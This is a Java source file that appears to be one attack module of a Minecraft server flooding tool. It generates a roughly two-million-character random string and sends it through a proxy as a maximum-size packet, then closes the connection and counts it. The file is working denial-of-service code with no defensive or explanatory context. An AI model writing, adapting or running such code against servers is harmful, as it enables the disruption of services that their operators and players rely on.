package dev.xdmeow.core.methods.impl;

import java.io.IOException;

import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.helper.RandomUtils;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class MaxsizePacket implements IMethod{
    int size = 2097151;
    String xd = "";
    
    public MaxsizePacket() {
        for (int i = 1; i < this.size; i++) {
            this.xd += RandomUtils.randomString(1);
        }
    }

    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
        while((paramInt & -128) != 0) {
           out.writeByte(paramInt & 127 | 128);
           paramInt >>>= 7;
        }
  
        out.writeByte(paramInt);
     }
     
    @Override
    public void accept(Channel channel, Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);
        try {
            writeVarInt(out, size);
            out.write(0);
            out.writeUTF(this.xd);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }  
        
        channel.writeAndFlush(b);
        NettyBootstrap.currentConnections++;
        NettyBootstrap.totalConnections++;
        channel.close();
    }

}
